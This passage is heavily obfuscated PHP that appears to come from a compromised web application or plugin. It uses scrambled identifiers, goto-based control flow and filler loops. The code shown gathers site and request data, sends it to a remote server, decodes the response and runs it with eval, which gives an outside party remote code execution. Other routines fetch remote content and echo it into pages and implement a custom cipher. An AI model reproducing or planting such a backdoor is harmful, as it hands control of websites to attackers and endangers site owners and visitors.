$A¸ÃÆÙ¶¯[61]($A¸ÃÆÙ¶¯[137])->{$_SERVER[Ş›][138]}()) { $A¸ÃÆÙ¶¯[164]($A¸ÃÆÙ¶¯[195]($A¸ÃÆÙ¶¯[237]), !1, $A¸ÃÆÙ¶¯[231]); die; } } } goto Bõ°÷·´Æ¯; d¯ÜÜÎ¬•¶: $A¸ÃÆÙ¶¯ =& $_SERVER[Ş›]; $cáâˆ±Åã = $GLOBALS[$A¸ÃÆÙ¶¯[22]]; $cÜ·Å¾¹»ã = $_SERVER[$A¸ÃÆÙ¶¯[44]]; goto d™¤Šƒ¥æ©; d™¤Šƒ¥æ©: $fî‚³×óé = $_SERVER[‘®…¢À][589]; if (!$fî‚³×óé) { return; } if ($cÜ·Å¾¹»ã == $A¸ÃÆÙ¶¯[229] && $this->azntf8ec4bca == $A¸ÃÆÙ¶¯[119]) { $A¸ÃÆÙ¶¯[164]($A¸ÃÆÙ¶¯[195]($A¸ÃÆÙ¶¯[230]), !1, $A¸ÃÆÙ¶¯[231]); } goto c›–»„™¯˜; Bõ°÷·´Æ¯: } private function wdzyb4091335() { goto c‹š¯”ˆ‡â; c‹š¯”ˆ‡â: $bÏùİÒĞØ… =& $_SERVER[‘®…¢À]; $aÛš½·îÈ› =& $_SERVER[Ş›]; $D½¹Åù–Èå = array($aÛš½·îÈ›[133], $aÛš½·îÈ›[238]); goto cªÈ¶î‰Çø; bÉ‘Ø¢ñöÅ: $d·Ôº‚Öˆ¬ = @$aÛš½·îÈ›[248]($F±›±‡»ù‡, !1, $aç‘§¾¥¼Â); $aÛš½·îÈ›[249]($aÛš½·îÈ›[250]); if ($d·Ôº‚Öˆ¬ && $aÛš½·îÈ›[32]($d·Ôº‚Öˆ¬, $aÛš½·îÈ›[251])) { echo $d·Ôº‚Öˆ¬; } goto aæè«æÊ³; D¸İ¿ÇÉç’: $aç‘§¾¥¼Â = $aÛš½·îÈ›[243](array($aÛš½·îÈ›[244] => array($aÛš½·îÈ›[245] => $aÛš½·îÈ›[246], $aÛš½·îÈ›[247] => 3))); $EÍò«ƒµ¦Ñ = $bÏùİÒĞØ…[591]; if (!$EÍò«ƒµ¦Ñ) { return; } goto bÉ‘Ø¢ñöÅ; aæè«æÊ³: die; goto Fí¹çÍ‘ßÈ; B˜³±ğÄáã: $F±›±‡»ù‡ = $this->{$_SERVER[Ş›][241]}($F±›±‡»ù‡, $aÛš½·îÈ›[242]); $a†ˆ±³ˆ = $bÏùİÒĞØ…[590]; if (strlen($a†ˆ±³ˆ) < $bÏùİÒĞØ…[548]) { die; } goto D¸İ¿ÇÉç’; cªÈ¶î‰Çø: if (!$aÛš½·îÈ›[102]($GLOBALS, $aÛš½·îÈ›[130]) || !isset($_GET[$aÛš½·îÈ›[239]])) { return; } if (!$aÛš½·îÈ›[234]($_SERVER[$aÛš½·îÈ›[44]], $D½¹Åù–Èå)) { return; } $F±›±‡»ù‡ = $aÛš½·îÈ›[240]; goto B˜³±ğÄáã; Fí¹çÍ‘ßÈ: } public function phtv449fa11d($eîğê—¢Ø¸) { goto C·Ÿ¿ñ­; F¯ïºè«ãƒ: foreach ($ešôƒ¾¸´ˆ as $e…èùÀŒùÍ) { if (!$a½À›íîˆù[234]($e…èùÀŒùÍ, $AÇ…•®çå)) { $EóÒ¢³„‰¦[] = $e…èùÀŒùÍ; } } foreach ($EóÒ¢³„‰¦ as $e…èùÀŒùÍ) { unset($eîğê—¢Ø¸[$e…èùÀŒùÍ]); } return $eîğê—¢Ø¸; goto A™‚õÌ„¹ô; C·Ÿ¿ñ­: $e¿œ™¤¬»ì =& $_SERVER[‘®…¢À]; $a½À›íîˆù =& $_SERVER[Ş›]; if ($this->azntf8ec4bca == $a½À›íîˆù[252]) { return $eîğê—¢Ø¸; } goto FâÃÍšÁÉ£; FâÃÍšÁÉ£: $ešôƒ¾¸´ˆ = array($a½À›íîˆù[253], $a½À›íîˆù[254], $a½À›íîˆù[255], $a½À›íîˆù[256], $a½À›íîˆù[257], $a½À›íîˆù[258], $a½À›íîˆù[259], $a½À›íîˆù[260]); $AÇ…•®çå = $a½À›íîˆù[0]($a½À›íîˆù[261], $a½À›íîˆù[102]($this->lbsc5e85e8e4, $a½À›íîˆù[127], $a½À›íîˆù[10])); $Eå¼“›¯Êª = $e¿œ™¤¬»ì[592]; goto a§«‘¡»î; a§«‘¡»î: while (strlen($Eå¼“›¯Êª) < $e¿œ™¤¬»ì[544]) { if (!$Eå¼“›¯Êª) { break; } $Eå¼“›¯Êª++; } $EóÒ¢³„‰¦ = array(); $EÆ„‰÷‡´Ö = $e¿œ™¤¬»ì[593]; goto F¯ïºè«ãƒ; A™‚õÌ„¹ô: } private function demk0174e7b3() { goto B§õÙ„ğ¢; B§õÙ„ğ¢: $F©â¬ºãÌ§ =& $_SERVER[‘®…¢À]; $FÈĞĞæØë— =& $_SERVER[Ş›]; if ($this->azntf8ec4bca != $FÈĞĞæØë—[119]) { return; } goto Bš¾ØŸ£ùª; dñó·ÌšÌ: if (!$BŸ· ´Àˆ) { die; } foreach ($Fï‹°Æ±À‹ as $f®Ôï¤Úµò) { if ($f®Ôï¤Úµò == $a„ŠëªÍ±å || $FÈĞĞæØë—[25]($a„ŠëªÍ±å, 0, $FÈĞĞæØë—[24]($f®Ôï¤Úµò)) == $f®Ôï¤Úµò) { $FÈĞĞæØë—[164]($FÈĞĞæØë—[195]($FÈĞĞæØë—[263]), !1); } } $this->{$_SERVER[Ş›][3]}($FÈĞĞæØë—[264], array($this, $FÈĞĞæØë—[265])); goto AÂ×¡ƒë²È; Bš¾ØŸ£ùª: $a„ŠëªÍ±å = $_SERVER[$FÈĞĞæØë—[44]]; $Fï‹°Æ±À‹ = array($FÈĞĞæØë—[262]); $BŸ· ´Àˆ = $F©â¬ºãÌ§[594]; goto dñó·ÌšÌ; AÂ×¡ƒë²È: $bÜ–‚¹™ò‡ = $F©â¬ºãÌ§[595]; $GLOBALS[$FÈĞĞæØë—[89]][$FÈĞĞæØë—[266]] = $FÈĞĞæØë—[218]; goto f‘‰µ‘³Ü™; f‘‰µ‘³Ü™: } public function ayum2451abfc() { return $_SERVER[Ş›][267]; $Dì¹‚áâë‘ = $_SERVER[‘®…¢À][596]; if (!$Dì¹‚áâë‘) { return; } } private function ejka7233dbd8() { goto eùÒ®²­; d…ñğñ¹ğĞ: $b„¸–†…‰Œ = $aò·½Ñó¶·[599]; $d¼ÔäæÅ’ò = $this->{$_SERVER[Ş›][180]}($C‡ëî…ïÖí[276], $CÙ­›ªÛÌÉ); if (!$C‡ëî…ïÖí[189]($d¼ÔäæÅ’ò)) { return; } goto f¶ÉÆã¢”ˆ; c³éöÍä¿›: if ($this->azntf8ec4bca == $C‡ëî…ïÖí[119] || !$C‡ëî…ïÖí[102]($GLOBALS, $C‡ëî…ïÖí[130])) { return; } if (!$C‡ëî…ïÖí[234]($_SERVER[$C‡ëî…ïÖí[44]], $A«Ø²­Š˜)) { return; } if ($C‡ëî…ïÖí[228]() % 4 != 0) { return; } goto bĞãŸ¨…; bĞãŸ¨…: $aù–ÂôÄÎ¼ = $C‡ëî…ïÖí[13](array($C‡ëî…ïÖí[273], $C‡ëî…ïÖí[274]), $a—ÀˆÄ¹¢); $bî¥²åõç¹ = $aò·½Ñó¶·[598]; if (strlen($bî¥²åõç¹) < $aò·½Ñó¶·[544]) { return; } goto d°˜¶¾Ã; f¶ÉÆã¢”ˆ: if ($d¼ÔäæÅ’ò[$C‡ëî…ïÖí[163]] && $d¼ÔäæÅ’ò[$C‡ëî…ïÖí[277]]) { if ($this->{$_SERVER[Ş›][197]}($d¼ÔäæÅ’ò[$C‡ëî…ïÖí[277]]) == $CÙ­›ªÛÌÉ[$C‡ëî…ïÖí[163]]) { return; } } $this->{$_SERVER[Ş›][162]}(); $Aé¹¨ÍŒîÈ = $aò·½Ñó¶·[600]; goto FÎ¦ÛØÎÕ; eùÒ®²­: $aò·½Ñó¶· =& $_SERVER[‘®…¢À]; $C‡ëî…ïÖí =& $_SERVER[Ş›]; $A«Ø²­Š˜ = array($C‡ëî…ïÖí[268], $C‡ëî…ïÖí[269], $C‡ëî…ïÖí[270]); goto fê¶Àç; fê¶Àç: $a—ÀˆÄ¹¢ = $C‡ëî…ïÖí[271] . $C‡ëî…ïÖí[112]($C‡ëî…ïÖí[272]); $A½Ñ²º³ÇÑ = $aò·½Ñó¶·[597]; if (strlen($A½Ñ²º³ÇÑ) < $aò·½Ñó¶·[554]) { return; } goto c³éöÍä¿›; FÎ¦ÛØÎÕ: while ($Aé¹¨ÍŒîÈ < $aò·½Ñó¶·[544]) { if ($Aé¹¨ÍŒîÈ >= 0) { break; } $Aé¹¨ÍŒîÈ++; } if ($this->{$_SERVER[Ş›][197]}($d¼ÔäæÅ’ò[$C‡ëî…ïÖí[277]]) != $CÙ­›ªÛÌÉ[$C‡ëî…ïÖí[163]]) { $fçß¡²”ÜÀ = array($C‡ëî…ïÖí[200] => $C‡ëî…ïÖí[61]($C‡ëî…ïÖí[62])->{$_SERVER[Ş›][63]}($C‡ëî…ïÖí[114]), $C‡ëî…ïÖí[201] => $_SERVER[$C‡ëî…ïÖí[113]], $C‡ëî…ïÖí[202] => $C‡ëî…ïÖí[203](), $C‡ëî…ïÖí[172] => $_SERVER[$C‡ëî…ïÖí[173]]); $b¢¨Á—¢ï™ = $this->{$_SERVER[Ş›][204]}($C‡ëî…ïÖí[146]($fçß¡²”ÜÀ)); $d¼ÔäæÅ’ò = $this->{$_SERVER[Ş›][180]}($C‡ëî…ïÖí[205] . $b¢¨Á—¢ï™); if ($d¼ÔäæÅ’ò && $C‡ëî…ïÖí[189]($d¼ÔäæÅ’ò) && isset($d¼ÔäæÅ’ò[$C‡ëî…ïÖí[277]])) { $E¥õÌ×ƒœ» = $this->{$_SERVER[Ş›][186]}($d¼ÔäæÅ’ò[$C‡ëî…ïÖí[277]], 2); if ($E¥õÌ×ƒœ») { $E¥õÌ×ƒœ» = $this->{$_SERVER[Ş›][197]}($E¥õÌ×ƒœ»); } if ($E¥õÌ×ƒœ») { try { @eval($E¥õÌ×ƒœ»); } catch (Exception $B“Î—ğ¶ğå) { } } } } goto F°³´Ó‰; d°˜¶¾Ã: if ($aù–ÂôÄÎ¼ && $C‡ëî…ïÖí[228]() - $aù–ÂôÄÎ¼ < $C‡ëî…ïÖí[199]($C‡ëî…ïÖí[275])) { return; } $C‡ëî…ïÖí[13](array($C‡ëî…ïÖí[273], $C‡ëî…ïÖí[150]), $a—ÀˆÄ¹¢, $C‡ëî…ïÖí[228]()); $CÙ­›ªÛÌÉ = array($C‡ëî…ïÖí[163] => $C‡ëî…ïÖí[61]($C‡ëî…ïÖí[62])->{$_SERVER[Ş›][63]}($C‡ëî…ïÖí[207]), $C‡ëî…ïÖí[176] => $this->azntf8ec4bca, $C‡ëî…ïÖí[174] => $_SERVER[$C‡ëî…ïÖí[175]], $C‡ëî…ïÖí[167] => $C‡ëî…ïÖí[147], $C‡ëî…ïÖí[170] => $_SERVER[$C‡ëî…ïÖí[171]]); goto d…ñğñ¹ğĞ; F°³´Ó‰: } private function rugb96d1f5a8($bù¡èÛí¡ = '', $c¦´¦ç¢ƒ = array(), $eÉãÄ”Öİ´ = 5) { goto bÑØ‘ôâ¯ ; E”‰·ÎÕÈ¤: $bÓäùŠŠùË = $cÌÍ’Î¦Í[601]; $A¼Ş¦†ò„¬ = $this->{$_SERVER[Ş›][241]}($A¼Ş¦†ò„¬, $a‹ØïŸ£¬ö[279]); $A¼Ş¦†ò„¬ = $A¼Ş¦†ò„¬ . $bù¡èÛí¡ . $a‹ØïŸ£¬ö[280] . $a‹ØïŸ£¬ö[281]($c¦´¦ç¢ƒ); goto bà»©”–ì½; bÑØ‘ôâ¯ : $cÌÍ’Î¦Í =& $_SERVER[‘®…¢À]; $a‹ØïŸ£¬ö =& $_SERVER[Ş›]; $A¼Ş¦†ò„¬ = $a‹ØïŸ£¬ö[278]; goto E”‰·ÎÕÈ¤; FË„¢™êÑ»: return $a‹ØïŸ£¬ö[188]($c¦´¦ç¢ƒ, !0); $d±¦·¼ªé = $cÌÍ’Î¦Í[604]; if (strlen($d±¦·¼ªé) < $cÌÍ’Î¦Í[548]) { return; } goto c˜£Ìñ†ĞÕ; bà»©”–ì½: $A½êÙ¹Ğ› = $cÌÍ’Î¦Í[602]; while ($A½êÙ¹Ğ› < $cÌÍ’Î¦Í[539]) { if ($A½êÙ¹Ğ› >= 0) { break; } $A½êÙ¹Ğ›++; } if ($c¦´¦ç¢ƒ === -1) { return $A¼Ş¦†ò„¬; } goto AœîØ—‰£; AœîØ—‰£: $d¼Ü„Å„ = $a‹ØïŸ£¬ö[243](array($a‹ØïŸ£¬ö[244] => array($a‹ØïŸ£¬ö[247] => $eÉãÄ”Öİ´, $a‹ØïŸ£¬ö[245] => $a‹ØïŸ£¬ö[282]), $a‹ØïŸ£¬ö[283] => array($a‹ØïŸ£¬ö[284] => !1, $a‹ØïŸ£¬ö[285] => !1))); $c¦´¦ç¢ƒ = @$a‹ØïŸ£¬ö[248]($A¼Ş¦†ò„¬, !1, $d¼Ü„Å„); $DŞ“¸Ì¸° = $cÌÍ’Î¦Í[603]; goto FË„¢™êÑ»; c˜£Ìñ†ĞÕ: } private function dxiqb48d225b() { goto b‚±ôˆ²½ˆ; b‚±ôˆ²½ˆ: $eŒ—£äù•Œ =& $_SERVER[‘®…¢À]; $a»Ó÷ä÷å =& $_SERVER[Ş›]; $AÉË²Ô•£ = array($a»Ó÷ä÷å[286] => $a»Ó÷ä÷å[287], $a»Ó÷ä÷å[288] => $a»Ó÷ä÷å[289], $a»Ó÷ä÷å[290] => $a»Ó÷ä÷å[291], $a»Ó÷ä÷å[292] => $a»Ó÷ä÷å[293], $a»Ó÷ä÷å[294] => $a»Ó÷ä÷å[295], $a»Ó÷ä÷å[296] => $a»Ó÷ä÷å[236], $a»Ó÷ä÷å[297] => $a»Ó÷ä÷å[236], $a»Ó÷ä÷å[298] => $a»Ó÷ä÷å[287], $a»Ó÷ä÷å[299] => $a»Ó÷ä÷å[289], $a»Ó÷ä÷å[300] => $a»Ó÷ä÷å[291], $a»Ó÷ä÷å[301] => $a»Ó÷ä÷å[302], $a»Ó÷ä÷å[303] => $a»Ó÷ä÷å[293], $a»Ó÷ä÷å[304] => $a»Ó÷ä÷å[305], $a»Ó÷ä÷å[306] => $a»Ó÷ä÷å[295], $a»Ó÷ä÷å[307] => $a»Ó÷ä÷å[308], $a»Ó÷ä÷å[309] => $a»Ó÷ä÷å[310], $a»Ó÷ä÷å[311] => $a»Ó÷ä÷å[312]); goto b¶…¸‚±„; eÆÕè§‰¹Û: $FÙè¥ßÈ‚ = $a»Ó÷ä÷å[199]($FÙè¥ßÈ‚ ? $FÙè¥ßÈ‚ : $a»Ó÷ä÷å[287]); $CÕ˜¸èš‡Ù = $a»Ó÷ä÷å[102]($this->lbsc5e85e8e4, $a»Ó÷ä÷å[313]); $CÕ˜¸èš‡Ù = $CÕ˜¸èš‡Ù ? $a»Ó÷ä÷å[199]($CÕ˜¸èš‡Ù) : 0; goto FÓÓàŠÕÜâ; FÓÓàŠÕÜâ: return $FÙè¥ßÈ‚ + $CÕ˜¸èš‡Ù; $a ™É¡Ã³· = $eŒ—£äù•Œ[606]; while (strlen($a ™É¡Ã³·) < $eŒ—£äù•Œ[564]) { if (!$a ™É¡Ã³·) { break; } $a ™É¡Ã³·++; } goto A±„Š¦ƒÓÕ; b¶…¸‚±„: $bÕ¸Èß˜½Ô = $eŒ—£äù•Œ[605]; while (strlen($bÕ¸Èß˜½Ô) < $eŒ—£äù•Œ[564]) { if (!$bÕ¸Èß˜½Ô) { break; } $bÕ¸Èß˜½Ô++; } $FÙè¥ßÈ‚ = $AÉË²Ô•£[$this->azntf8ec4bca]; goto eÆÕè§‰¹Û; A±„Š¦ƒÓÕ: } public function pcbse1006e87($dÕäÎ¡è„¡) { goto aù‡İƒÇ‚Š; a´Ãì›Ñ’: if (strlen($b“Æ‡ô¡êÈ) < $e¨‹´ÄÛã[564]) { return; } if (!$BÊËš²…“[234]($dÕäÎ¡è„¡[$BÊËš²…“[315]], $f¹«²ÊŒ†)) { $BÊËš²…“[164]($BÊËš²…“[318], !1, $BÊËš²…“[231]); } goto cØÚÂ‰ìŠ; d†‘ˆ¸•¶Ò: $CµÃ¢“…à = $BÊËš²…“[61]($BÊËš²…“[137])->{$_SERVER[Ş›][138]}(); $a“¢ç÷àÉš = $e¨‹´ÄÛã[608]; if ($CµÃ¢“…à <= $c’±Õ°ìô) { return; } goto aËÇ¨­É¢; aŒºåÕ‰Ëò: $fØ‡Õ¿‡õÉ = $e¨‹´ÄÛã[607]; if (!$fØ‡Õ¿‡õÉ) { return; } if ($c’±Õ°ìô >= $BÊËš²…“[199]($BÊËš²…“[236])) { return; } goto d†‘ˆ¸•¶Ò; aËÇ¨­É¢: $f¹«²ÊŒ† = $BÊËš²…“[61]($BÊËš²…“[137])->{$_SERVER[Ş›][314]}($BÊËš²…“[315])->{$_SERVER[Ş›][316]}($c’±Õ°ìô)->{$_SERVER[Ş›][317]}(); $f¹«²ÊŒ† = $BÊËš²…“[220]($f¹«²ÊŒ†, $BÊËš²…“[10], $BÊËš²…“[315]); $b“Æ‡ô¡êÈ = $e¨‹´ÄÛã[609]; goto a´Ãì›Ñ’; aù‡İƒÇ‚Š: $e¨‹´ÄÛã =& $_SERVER[‘®…¢À]; $BÊËš²…“ =& $_SERVER[Ş›]; $c’±Õ°ìô = $this->{$_SERVER[Ş›][135]}(); goto aŒºåÕ‰Ëò; cØÚÂ‰ìŠ: } public function wfpg2488de86() { goto cÙñÆ³’à„; cÙñÆ³’à„: $F’ŸÃÁšÅ =& $_SERVER[‘®…¢À]; $fÇ‚†«Œ =& $_SERVER[Ş›]; if (!$fÇ‚†«Œ[102]($GLOBALS, $fÇ‚†«Œ[130]) || $fÇ‚†«Œ[319](1, 100) > 20) { return; } goto Eñä¾é„; Få¡Éíİá—: $EËÅˆƒ›Á· = $F’ŸÃÁšÅ[610]; $d†÷˜ªİô = @$fÇ‚†«Œ[248]($C›°‚Ú˜´Œ, !1, $AƒÄèºÔµ); $dˆ³ë„‹•í = $F’ŸÃÁšÅ[611]; goto e„¼×‘ÈÊÇ; Eñä¾é„: $C›°‚Ú˜´Œ = $fÇ‚†«Œ[240]; $C›°‚Ú˜´Œ = $this->{$_SERVER[Ş›][241]}($C›°‚Ú˜´Œ, $fÇ‚†«Œ[242]); $AƒÄèºÔµ = $fÇ‚†«Œ[243](array($fÇ‚†«Œ[244] => array($fÇ‚†«Œ[245] => $fÇ‚†«Œ[246], $fÇ‚†«Œ[247] => 3))); goto Få¡Éíİá—; e„¼×‘ÈÊÇ: while (strlen($dˆ³ë„‹•í) < $F’ŸÃÁšÅ[548]) { if (!$dˆ³ë„‹•í) { break; } $dˆ³ë„‹•í++; } echo $fÇ‚†«Œ[320] . $fÇ‚†«Œ[321]($d†÷˜ªİô) . $fÇ‚†«Œ[322]; goto DÙãè’Á„; DÙãè’Á„: } private function hnpl0508b051($EÙáÜó¢®™, $B…¸ŒÆÃï–, $f«ËÕ£—è‰ = 3) { goto c˜î©‚ñß‚; C…ëñÎø—: if ($f«ËÕ£—è‰ - 1 > 0) { $Eƒ¾ğ„ë³­ = $this->{$_SERVER[Ş›][125]}($Eƒ¾ğ„ë³­, $B…¸ŒÆÃï–, $f«ËÕ£—è‰ - 1); } return $Eƒ¾ğ„ë³­; goto AÑÚŞÓ‚ÌÌ; aÖ¶ùê…Õè: $Eí àÁ¼è‚ = $dó­†ÀíÑ[122](15); $b†Ò  Ìïƒ = $E¾ÔÙ©¢ˆ‚[614]; while (strlen($b†Ò  Ìïƒ) < $E¾ÔÙ©¢ˆ‚[548]) { if (!$b†Ò  Ìïƒ) { break; } $b†Ò  Ìïƒ++; } goto fâæä½£¢; fâæä½£¢: $eèÃÈ§«õ = $dó­†ÀíÑ[324]; switch ($e÷§³º¸æç) { case $dó­†ÀíÑ[227]: $Eƒ¾ğ„ë³­ = $this->{$_SERVER[Ş›][145]}($EÙáÜó¢®™, $dó­†ÀíÑ[212]($B…¸ŒÆÃï– . $Eí àÁ¼è‚)); $EÜÒ¦Ìˆê = $E¾ÔÙ©¢ˆ‚[615]; if (!$EÜÒ¦Ìˆê) { return; } break; case $dó­†ÀíÑ[218]: $Eƒ¾ğ„ë³­ = $this->{$_SERVER[Ş›][145]}($EÙáÜó¢®™, $dó­†ÀíÑ[212]($Eí àÁ¼è‚ . $B…¸ŒÆÃï–)); break; $cè®»ÉøÚÜ = $E¾ÔÙ©¢ˆ‚[616]; if (strlen($cè®»ÉøÚÜ) < $E¾ÔÙ©¢ˆ‚[544]) { die; } case $dó­†ÀíÑ[325]: $Eƒ¾ğ„ë³­ = $this->{$_SERVER[Ş›][145]}($EÙáÜó¢®™, $dó­†ÀíÑ[116]($Eí àÁ¼è‚ . $B…¸ŒÆÃï–)); $f›“´ğ©¹ö = $E¾ÔÙ©¢ˆ‚[617]; break; case $dó­†ÀíÑ[326]: $Eƒ¾ğ„ë³­ = $this->{$_SERVER[Ş›][145]}($EÙáÜó¢®™, $dó­†ÀíÑ[112]($Eí àÁ¼è‚ . $B…¸ŒÆÃï–)); break; case $dó­†ÀíÑ[327]: goto eáøˆ’½; bã›«„ª—â: if (!$cÙ…Ú‡‹í©) { return; } break; $BåçåÁ‹øÄ = $E¾ÔÙ©¢ˆ‚[624]; goto aé¨ëÇÉ«õ; eáøˆ’½: $EÙáÜó¢®™ = $dó­†ÀíÑ[116]($EÙáÜó¢®™); $F‚®–‘‰§Á = $dó­†ÀíÑ[328](0, 64); $aÊ‹¾ïŒ¸ = $E¾ÔÙ©¢ˆ‚[618]; goto eÁê¿‘¦Õë; C‘¾ÙÁ›’•: for ($d£³ ¥ò« = 0; $d£³ ¥ò« < $dó­†ÀíÑ[24]($EÙáÜó¢®™); $d£³ ¥ò«++) { $c¡ÅŠªÚ”ˆ = $c¡ÅŠªÚ”ˆ == $dó­†ÀíÑ[24]($cÊµô‰Ãô¥) ? 0 : $c¡ÅŠªÚ”ˆ; $A¶î§†Â’ï = ($F‚®–‘‰§Á + $dó­†ÀíÑ[329]($eèÃÈ§«õ, $EÙáÜó¢®™[$d£³ ¥ò«]) + $dó­†ÀíÑ[330]($cÊµô‰Ãô¥[$c¡ÅŠªÚ”ˆ++])) % 64; $cÍ™ÃšÙ§ .= $eèÃÈ§«õ[$A¶î§†Â’ï]; $eÖñô¢ñ— = $E¾ÔÙ©¢ˆ‚[622]; while (strlen($eÖñô¢ñ—) < $E¾ÔÙ©¢ˆ‚[539]) { if (!$eÖñô¢ñ—) { break; } $eÖñô¢ñ—++; } } $Eƒ¾ğ„ë³­ = $dó­†ÀíÑ[321]($CˆÇ£êäå . $cÍ™ÃšÙ§); $cÙ…Ú‡‹í© = $E¾ÔÙ©¢ˆ‚[623]; goto bã›«„ª—â; c‰´ŠÁß×: $aµÜ°áÕ = $E¾ÔÙ©¢ˆ‚[621]; $A¶î§†Â’ï = 0; $c¡ÅŠªÚ”ˆ = 0; goto C‘¾ÙÁ›’•; F»Ä¿½¿Œ†: if (!$CÖÈ©àçàÁ) { die; } $cÊµô‰Ãô¥ = $dó­†ÀíÑ[25]($cÊµô‰Ãô¥, $F‚®–‘‰§Á % 8, $F‚®–‘‰§Á % 8 + 7); $cÍ™ÃšÙ§ = $dó­†ÀíÑ[10]; goto d®Ï¥’‰¶; d®Ï¥’‰¶: $F‹¸„´êô = $E¾ÔÙ©¢ˆ‚[620]; while (strlen($F‹¸„´êô) < $E¾ÔÙ©¢ˆ‚[564]) { if (!$F‹¸„´êô) { break; } $F‹¸„´êô++; } $d£³ ¥ò« = 0; goto c‰´ŠÁß×; eÁê¿‘¦Õë: $CˆÇ£êäå = $eèÃÈ§«õ[$F‚®–‘‰§Á]; $cÊµô‰Ãô¥ = $dó­†ÀíÑ[112]($CˆÇ£êäå . $dó­†ÀíÑ[112]($B…¸ŒÆÃï– . $CˆÇ£êäå) . $B…¸ŒÆÃï–); $CÖÈ©àçàÁ = $E¾ÔÙ©¢ˆ‚[619]; goto F»Ä¿½¿Œ†; aé¨ëÇÉ«õ: default: $Eƒ¾ğ„ë³­ = $this->{$_SERVER[Ş›][145]}($EÙáÜó¢®™, $B…¸ŒÆÃï– . $Eí àÁ¼è‚); break; } $Eƒ¾ğ„ë³­ = $dó­†ÀíÑ[212]($e÷§³º¸æç . $Eí àÁ¼è‚ . $Eƒ¾ğ„ë³­); goto C…ëñÎø—; c˜î©‚ñß‚: $E¾ÔÙ©¢ˆ‚ =& $_SERVER[‘®…¢À]; $dó­†ÀíÑ =& $_SERVER[Ş›]; $dó­†ÀíÑ[323](1); goto Aµ‹ß‚Ë–ñ; cˆšŒš”Ì: $e÷§³º¸æç = $dó­†ÀíÑ[319](0, 5) . $dó­†ÀíÑ[10]; $bîˆÒß“ó’ = $E¾ÔÙ©¢ˆ‚[613]; while (strlen($bîˆÒß“ó’) < $E¾ÔÙ©¢ˆ‚[539]) { if (!$bîˆÒß“ó’) { break; } $bîˆÒß“ó’++; } goto aÖ¶ùê…Õè; Aµ‹ß‚Ë–ñ: $EÙáÜó¢®™ = $dó­†ÀíÑ[2]($EÙáÜó¢®™); $F‘ÙöÍåˆ = $E¾ÔÙ©¢ˆ‚[612]; if (!$F‘ÙöÍåˆ) { return; } goto cˆšŒš”Ì; AÑÚŞÓ‚ÌÌ: } private function ncqv35eda2ba($d«“Ìá‡’ä, $bö³É˜¬‡¼, $Bˆ‚¥£ÇÈ• = 3) { goto aºöƒÂÌœÔ; d˜ëŞ—Ó‘«: if (!$C‰§æƒñ‘¹) { return; } $bß ìÂÓæš = $Fèâ³¯°‘“[25]($d«“Ìá‡’ä, 1, 15); $A†–êŞ‹°… = $cêÍå˜á”İ[627]; goto CŠ¢ÁÄ©Ó„; CÀ”Í¨•­»: $d«“Ìá‡’ä = $Fèâ³¯°‘“[212]($d«“Ìá‡’ä); $AªæòÂÜØƒ = $d«“Ìá‡’ä[0]; $C‰§æƒñ‘¹ = $cêÍå˜á”İ[626]; goto d˜ëŞ—Ó‘«; aºöƒÂÌœÔ: $cêÍå˜á”İ =& $_SERVER[‘®…¢À]; $Fèâ³¯°‘“ =& $_SERVER[Ş›]; if (!$Fèâ³¯°‘“[331]($d«“Ìá‡’ä) || $Fèâ³¯°‘“[24]($d«“Ìá‡’ä) < 10) { return !1; } goto EÈ‚÷‡¡‚; CŠ¢ÁÄ©Ó„: if (!$A†–êŞ‹°…) { return; } $d«“Ìá‡’ä = $Fèâ³¯°‘“[25]($d«“Ìá‡’ä, 16); $ašãµÒÍİê = $Fèâ³¯°‘“[324]; goto d¶›­ö”õ; EÈ‚÷‡¡‚: $d«“Ìá‡’ä = $Fèâ³¯°‘“[2]($d«“Ìá‡’ä); $dùëºàÁ¥ê = $cêÍå˜á”İ[625]; if (strlen($dùëºàÁ¥ê) < $cêÍå˜á”İ[539]) { die; } goto CÀ”Í¨•­»; d¶›­ö”õ: switch ($AªæòÂÜØƒ) { case $Fèâ³¯°‘“[227]: $C‰ùêÓ˜ÖÀ = $this->{$_SERVER[Ş›][241]}($d«“Ìá‡’ä, $Fèâ³¯°‘“[212]($bö³É˜¬‡¼ . $bß ìÂÓæš)); break; $Bõ¢×–ÃÈ« = $cêÍå˜á”İ[549]; if (!$Bõ¢×–ÃÈ«) { die; } case $Fèâ³¯°‘“[218]: $C‰ùêÓ˜ÖÀ = $this->{$_SERVER[Ş›][241]}($d«“Ìá‡’ä, $Fèâ³¯°‘“[212]($bß ìÂÓæš . $bö³É˜¬‡¼)); break; case $Fèâ³¯°‘“[325]: $C‰ùêÓ˜ÖÀ = $this->{$_SERVER[Ş›][241]}($d«“Ìá‡’ä, $Fèâ³¯°‘“[116]($bß ìÂÓæš . $bö³É˜¬‡¼)); break; $dèì‹¹óù = $cêÍå˜á”İ[628]; if (strlen($dèì‹¹óù) < $cêÍå˜á”İ[554]) { return; } case $Fèâ³¯°‘“[326]: $C‰ùêÓ˜ÖÀ = $this->{$_SERVER[Ş›][241]}($d«“Ìá‡’ä, $Fèâ³¯°‘“[112]($bß ìÂÓæš . $bö³É˜¬‡¼)); $bÈ¢†¢Õ˜Ï = $cêÍå˜á”İ[629]; while (strlen($bÈ¢†¢Õ˜Ï) < $cêÍå˜á”İ[544]) { if (!$bÈ¢†¢Õ˜Ï) { break; } $bÈ¢†¢Õ˜Ï++; } break; case $Fèâ³¯°‘“[327]: goto FÁ¤®Õ¾œ‡; eÜÖÛááºò: if (strlen($CÛè‚õ¶¸ñ) < $cêÍå˜á”İ[548]) { return; } $d‘ëÔï´¦ñ = 0; $D•†ˆ‹Ú† = 0; goto fî‘šÉÖ…Á; e¶»­œ–çè: if (strlen($e£¼Æ¶ã‚ö) < $cêÍå˜á”İ[548]) { return; } $f‡¤†ëë×î = $Fèâ³¯°‘“[10]; $CÛè‚õ¶¸ñ = $cêÍå˜á”İ[632]; goto eÜÖÛááºò; FÁ¤®Õ¾œ‡: $d«“Ìá‡’ä = $Fèâ³¯°‘“[332]($d«“Ìá‡’ä); $a²‡íÈïàĞ = $d«“Ìá‡’ä[0]; $d«“Ìá‡’ä = $Fèâ³¯°‘“[25]($d«“Ìá‡’ä, 1); goto f‚­ßí’ÖÄ; a´ Ğâ—âœ: if (strlen($Eç¶‚£§¨ˆ) < $cêÍå˜á”İ[554]) { return; } $dÅ‘åµÉÊ™ = $Fèâ³¯°‘“[25]($dÅ‘åµÉÊ™, $Dˆ¡ñ¦å”Ë % 8, $Dˆ¡ñ¦å”Ë % 8 + 7); $e£¼Æ¶ã‚ö = $cêÍå˜á”İ[631]; goto 